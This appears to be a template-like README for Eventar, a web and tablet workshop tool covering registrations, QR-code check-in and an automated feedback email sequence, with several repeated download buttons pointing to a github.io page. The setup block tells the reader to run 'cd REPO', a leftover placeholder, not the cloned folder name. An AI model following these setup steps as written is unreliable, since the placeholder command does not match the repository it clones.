# Eventar - Workshop Management 2026

> **Eventar is a web and tablet-based workshop management tool for creating sessions, coordinating registrations, checking attendance with personal QR codes, and gathering feedback through an email workflow.**

[![Platform](https://img.shields.io/badge/Platform-Web%20and%20tablet-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/niklaswagner3/eventar-registration-hub?style=flat-square)](https://github.com/niklaswagner3/eventar-registration-hub)

---

<p align="center">
  <a href="https://niklaswagner3.github.io/eventar-registration-hub/">
    <img src="https://img.shields.io/badge/Download-Eventar%20Latest-brightgreen?style=for-the-badge" alt="Download Eventar">
  </a>
</p>

> **[Direct Download - Eventar](https://niklaswagner3.github.io/eventar-registration-hub/)**

---

[Download Latest Build](https://niklaswagner3.github.io/eventar-registration-hub/)

---

## What Eventar Does

Eventar brings the main stages of workshop administration into a single workflow. Teams can set up workshop records, organize registrations, follow attendance, and continue with participant feedback after the session instead of handling each task separately.

The application runs through a browser on computers and tablets. Personal QR codes make check-in faster, and automated feedback collection works alongside a three-email communication sequence to connect participant outreach with the workshop process.

---

## Core Capabilities

- Set up and arrange workshop records
- Maintain participant registrations
- Record attendance using individual QR codes
- Turn a tablet into an attendance scanning device
- Automate participant feedback collection
- Run a three-email communication sequence
- Use the application from a web browser
- Operate Eventar on tablets during workshops

---

## Getting Started

First, clone the repository and move into the project directory:

```bash
git clone https://github.com/niklaswagner3/eventar-registration-hub.git
cd REPO
```

Eventar is delivered as a web application. Run it through a local static web server, or open the entry page in a compatible browser. If the tablet will be used for scanning, publish the project at a web address the device can reach before beginning workshop check-in.

---

## Typical Workflow

The usual process can be organized as follows:

1. Set up the workshop.
2. Create or maintain the participant registrations.
3. Send the workshop's communication sequence.
4. Issue each participant a personal QR code.
5. Load Eventar on a tablet at the entrance.
6. Scan participant QR codes to capture attendance.
7. Let the feedback process run automatically after the workshop.

Before the event, use the workshop and registration views to review and maintain the participant information needed for administration.

---

## Deployment and Configuration

Configuration options are determined by the way the web project is served. Consult the repository files for the applicable application settings, workshop and registration options, and email workflow configuration.

For tablet check-in, verify in advance that the deployed site can be opened from the tablet and that participant QR codes are ready to scan.

---

## Requirements

- A current web browser
- A computer or tablet with web access
- A tablet capable of QR-code attendance scanning
- A local web server or deployment environment for serving the HTML application
- Workshop and participant registration data
- Email delivery capability for the three-email workflow

---

## Frequently Asked Questions

### What teams can use Eventar?

Eventar is intended for workshop organizers who need one workflow for registrations, attendance, participant messaging, and feedback.

### Is tablet operation supported?

Yes. Eventar supports web and tablet use, including scanning personal QR codes from a tablet during check-in.

### What is the attendance process?

Each participant receives a personal QR code. At the workshop, that code can be scanned with a tablet to record attendance.

### Is feedback collection built in?

Yes. Feedback is part of the workshop workflow and may be collected automatically.

### How many messages does the email sequence contain?

The described communication process consists of three emails.

### What can I do when QR scanning fails?

Make sure the tablet can access the deployed Eventar site. Also check that the browser can use the device camera when necessary and that the QR code being scanned is sharp and easy to read.

### Where can I configure Eventar?

Available settings are controlled through the project and its deployment configuration. Review the repository files to identify the supported options before starting the application.

### How can I obtain the latest changes?

Use the repository's latest build link, or update an existing local checkout with:

```bash
git pull
```

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
